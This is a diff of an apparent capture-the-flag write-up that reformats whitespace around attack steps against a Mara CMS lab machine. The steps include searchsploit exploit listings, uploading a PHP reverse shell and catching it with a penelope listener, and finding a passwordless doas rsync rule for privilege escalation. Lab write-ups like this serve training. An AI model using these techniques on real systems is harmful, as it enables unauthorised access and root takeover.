@@ -86,14 +86,14 @@ So, the path leads us to Mara CMS. We don't know the exact version, but we know 
 
 ```bash
 kali@kali:searchsploit mara cms                                                                                                                 
--------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                          |  Path
--------------------------------------------------------------------------------------------------------- ---------------------------------
-Elxis CMS 2009 - 'administrator/index.php' URI Cross-Site Scripting                                     | php/webapps/36407.txt
-Elxis CMS 2009 - 'index.php?task' Cross-Site Scripting                                                  | php/webapps/36406.txt
-Mara CMS  7.5 - Reflective Cross-Site Scripting                                                         | php/webapps/48777.txt
-Mara CMS 7.5 - Remote Code Execution (Authenticated)                                                    | php/webapps/48780.txt
--------------------------------------------------------------------------------------------------------- ---------------------------------
+--------------------------------------------------------------------------------------------------- -----------------------
+ Exploit Title                                                                                     |  Path
+--------------------------------------------------------------------------------------------------- -----------------------
+Elxis CMS 2009 - 'administrator/index.php' URI Cross-Site Scripting                                | php/webapps/36407.txt
+Elxis CMS 2009 - 'index.php?task' Cross-Site Scripting                                             | php/webapps/36406.txt
+Mara CMS  7.5 - Reflective Cross-Site Scripting                                                    | php/webapps/48777.txt
+Mara CMS 7.5 - Remote Code Execution (Authenticated)                                               | php/webapps/48780.txt
+--------------------------------------------------------------------------------------------------- -----------------------
 Shellcodes: No Results
 ```
 
@@ -121,7 +121,7 @@ So, following the exploit I uploaded the php reverse shell and it is found at *h
 Start the listener.
 
 ```bash
-kali@kali:penelope -p 4444                                                                                                                                    
+kali@kali:penelope -p 4444
 [+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
@@ -129,15 +129,15 @@ kali@kali:penelope -p 4444
 Refresh the page.
 
 ```bash
-kali@kali:penelope -p 4444                                                                                                                                    
+kali@kali:penelope -p 4444
 [+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 [+] Got reverse shell from ubuntu-xenial~10.49.140.184-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
-[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
 [+] Logging to /home/kali/.penelope/sessions/ubuntu-xenial~10.49.140.184-Linux-x86_64/2026_02_16-13_45_00-794.log 📜
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 www-data@ubuntu-xenial:/$ 
 ```
 
@@ -227,17 +227,17 @@ No sudo, we cannot list SUID, no cronjobs. Let's see if we can get anything from
 
 ```bash
 ╔══════════╣ Doas Configuration
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#doas                                                                  
-Doas binary found at: /usr/local/bin/doas                                                                                                               
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#doas
+Doas binary found at: /usr/local/bin/doas
 Doas binary has SUID bit set!
 -rwsr-x--x 1 root root 38616 Dec  6  2020 /usr/local/bin/doas
--e 
+-e
 Checking doas.conf files:
 Found: /usr/local/bin/../etc/doas.conf
  permit nopass kiran as root cmd rsync
 Found: /usr/local/etc/doas.conf
  permit nopass kiran as root cmd rsync
--e 
+-e
 Testing doas:
 ```
 
